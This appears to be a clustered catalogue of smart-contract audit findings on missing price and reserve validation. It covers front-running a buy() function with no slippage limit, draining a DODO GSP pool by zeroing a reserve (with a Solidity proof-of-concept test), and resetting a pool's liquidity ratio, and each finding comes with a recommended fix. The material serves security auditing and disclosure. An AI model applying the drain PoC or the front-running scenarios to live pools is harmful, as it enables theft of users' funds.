# Cluster -1431

**Rank:** #455  
**Count:** 7  

## Label
Lack of price validation enables attackers to manipulate token prices or exchange rates, allowing them to extract assets or inflate supply through front-running and MEV exploitation.

## Cluster Information
- **Total Findings:** 7

## Examples

### Example 1

**Auto Label:** Lack of price validation enables attackers to manipulate token prices or exchange rates, allowing them to extract assets or inflate supply through front-running and MEV exploitation.  

**Original Text Preview:**

## Severity

**Impact:** High

**Likelihood:** Low

## Description

When buying a coin through `buy()` in GroupcoinFactory.sol, the buyer will attach some `msg.value` to the function in order to buy a certain number of coins. In `buy()`, there is no slippage protection, so a malicious user can buy

For example,

- Alice wants to buy 1000 Acoin. She is the first buyer and she calculates that she needs about 3434501 wei of ETH to buy (amount calculated from the `getPrice()` function. Alice knows that the protocol will refund any excess ETH that she sends in, so she simply passes in 1e18 worth of ETH.
- Bob sees that transaction and frontruns her, by buying 1,000,000 Acoin for about 3429360425241769 wei. Now, Alice's transaction goes through, and `totalSupply()` of Acoin becomes 1 million instead of 0.
- Alice 1000 Acoins is now 10298367632031 wei of ETH, and the transfer goes through because she attached 1e18 worth of ETH.

## Recommendations

To protect the buyers, add another parameter `maxPrice` to make sure that the buyer is willing to pay x amount of tokens until it reaches the max price. In Alice's case, her max price would be 4000000 wei, so her transaction will be reverted if the coin is any price above that.

Sample example:

```
    function buy(uint256 tokenId, uint256 amount, uint256 maxPrice) public payable {
        ...
        if (msg.value < price + protocolFeeTaken) {
            revert NotEnough();
        }
        if(maxPrice != 0){
        require(maxPrice > price + protocolFeeTaken, "Price too expensive")
        }
```

If the maxPrice is not set, then it is assumed that the buyer accepts that there is no slippage protection.

---
### Example 2

**Auto Label:** Insufficient reserve validation enables attackers to manipulate pricing, bypass safeguards, and extract funds via front-running or flawed state transitions.  

**Original Text Preview:**

Source: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/122 

## Found by 
cergyk, mstpr-brainbot
## Summary
The pool can be depleted because swaps allow the withdrawal of the entire balance, resulting in a reserve of 0 for a specific asset. When an asset's balance reaches 0, the PMMPricing algorithm incorrectly estimates the calculation of output amounts. Consequently, the entire pool can be exploited using a flash loan by depleting one of the tokens to 0 and then swapping back to the pool whatever is received.
## Vulnerability Detail
Firstly, as indicated in the summary, selling quote/base tokens can lead to draining the opposite token in the pool, potentially resulting in a reserve of 0. Consequently, the swapping mechanism permits someone to entirely deplete the token balance within the pool. In such cases, the calculations within the pool mechanism become inaccurate. Therefore, swapping back to whatever has been initially purchased will result in acquiring more tokens, further exacerbating the depletion of the pool.

Allow me to provide a PoC to illustrate this scenario:
```solidity
function test_poolCanBeDrained() public {
        // @review 99959990000000000000000 this amount makes the reserve 0
        // run a fuzz test, to get the logs easily I will just use this value as constant but I found it via fuzzing
        // selling this amount to the pool will make the quote token reserves "0".
        vm.startPrank(tapir);
        uint256 _amount = 99959990000000000000000;

        //  Buy shares with tapir, 10 - 10 initiate the pool
        dai.transfer(address(gsp), 10 * 1e18);
        usdc.transfer(address(gsp), 10 * 1e6);
        gsp.buyShares(tapir);

        // make sure the values are correct with my math
        assertTrue(gsp._BASE_RESERVE_() == 10 * 1e18);
        assertTrue(gsp._QUOTE_RESERVE_() == 10 * 1e6);
        assertTrue(gsp._BASE_TARGET_() == 10 * 1e18);
        assertTrue(gsp._QUOTE_TARGET_() == 10 * 1e6);
        assertEq(gsp.balanceOf(tapir), 10 * 1e18);
        vm.stopPrank();
        
        // sell such a base token amount such that the quote reserve is 0
        // I calculated the "_amount" already which will make the quote token reserve "0"
        vm.startPrank(hippo);
        deal(DAI, hippo, _amount);
        dai.transfer(address(gsp), _amount);
        uint256 receivedQuoteAmount = gsp.sellBase(hippo);

        // print the reserves and the amount received by hippo when he sold the base tokens
        console.log("Received quote amount by hippo", receivedQuoteAmount);
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());

        // Quote reserve is 0!!! That means the pool has 0 assets, basically pool has only one asset now!
        // this behaviour is almost always not a desired behaviour because we never want our assets to be 0 
        // as a result of swapping or removing liquidity.
        assertEq(gsp._QUOTE_RESERVE_(), 0);

        // sell the quote tokens received back to the pool immediately
        usdc.transfer(address(gsp), receivedQuoteAmount);

        // cache whatever received base tokens from the selling back
        uint256 receivedBaseAmount = gsp.sellQuote(hippo);

        console.log("Received base amount by hippo", receivedBaseAmount);
        console.log("Base target", gsp._BASE_TARGET_());
        console.log("Quote target", gsp._QUOTE_TARGET_());
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());
        
        // whatever received in base tokens are bigger than our first flashloan! 
        // means that we have a profit!
        assertGe(receivedBaseAmount, _amount);
        console.log("Profit for attack", receivedBaseAmount - _amount);
    }
```

Test results and logs:
<img width="529" alt="image" src="https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/ac3f07f2-281f-485e-b8df-812045f8a88b">

## Impact
Pool can be drained, funds are lost. Hence, high. Though, this can only happen when there are no "LP_FEES". However, when we check the default settings of the deployment, we see [here](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/scripts/DeployGSP.s.sol#L22) that the LP_FEE is set to 0. So, it is ok to assume that the LP_FEES can be 0.

## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol#L40-L113
## Tool used

Manual Review

## Recommendation
Do not allow the pools balance to be 0 or do not let LP_FEE to be 0 in anytime.  



## Discussion

**sherlock-admin2**

> Escalate
> 
> Issues #51, #96 and #157 are missing the crucial second step of swapping back to actually drain the pool, and thus describe a low impact.
> They should be unduplicated from this issue

    You've deleted an escalation for this issue.

**nevillehuang**

@CergyK those are not duplicates, I have removed them already. You might want to remove the escalation.

**CergyK**

> @CergyK those are not duplicates, I have removed them already. You might want to remove the escalation.

Thank you, escalation removed

**Skyewwww**

We have fixed this bug at this PR: https://github.com/DODOEX/dodo-gassaving-pool/pull/15

---
### Example 3

**Auto Label:** Insufficient reserve validation enables attackers to manipulate pricing, bypass safeguards, and extract funds via front-running or flawed state transitions.  

**Original Text Preview:**

## Diﬃculty: High

## Type: Data Validation

## Description
Even with a properly set slippage guard, a depositor calling `addLiquidity` can be front run by a sole liquidity holder, which would cause the depositor to lose funds. When either of the reserves of a pool is less than the dust (100 wei), any call to `addLiquidity` will cause the pool to reset the reserves ratio.

```solidity
// If either reserve is less than dust then consider the pool to be empty and that
// the added liquidity will become the initial token ratio
if ( ( reserve0 <= PoolUtils.DUST ) || ( reserve1 <= PoolUtils.DUST ) ) {
    // Update the reserves
    reserves.reserve0 += maxAmountA;
    reserves.reserve1 += maxAmountB;
    return ( maxAmountA, maxAmountB, Math.sqrt(maxAmountA * maxAmountB) );
}
```
*Figure 3.1: src/pools/Pools.sol#L112-L120*

## Exploit Scenario
Eve is the sole liquidity holder in the WETH/DAI pool, which has reserves of 100 WETH and 200,000 DAI, for a ratio of 1:2,000.

1. Alice submits a transaction to add 10 WETH and 20,000 DAI of liquidity.
2. Eve front runs Alice’s transaction with a `removeLiquidity` transaction that brings one of the reserves down to close to zero.
3. As the last action of her transaction, Eve adds liquidity, but because one of the reserves is close to zero, whatever ratio she adds to the pool becomes the new reserves ratio. In this example, Eve adds the ratio 10:2,000 (representing a WETH price of 200 DAI).
4. Alice’s `addLiquidity` transaction goes through, but because of the new K ratio, the logic lets her add only 10 WETH and 2,000 DAI. The liquidity slippage guard does not work because the reserves ratio has been reset. In nominal terms, Alice actually receives more liquidity than she would have at the previous ratio.
5. Eve back runs this transaction with a swap transaction that buys most of the WETH that Alice just deposited for a starting price of 200 DAI. Eve then removes her liquidity, effectively stealing Alice’s 10 WETH for a fraction of the price.

## Recommendations
- **Short term:** Add a mechanism to prevent reserves from dropping below dust levels.
- **Long term:** Carefully assess invariants and situations in which front-running may affect functionality. Invariant testing would be useful for this.

---
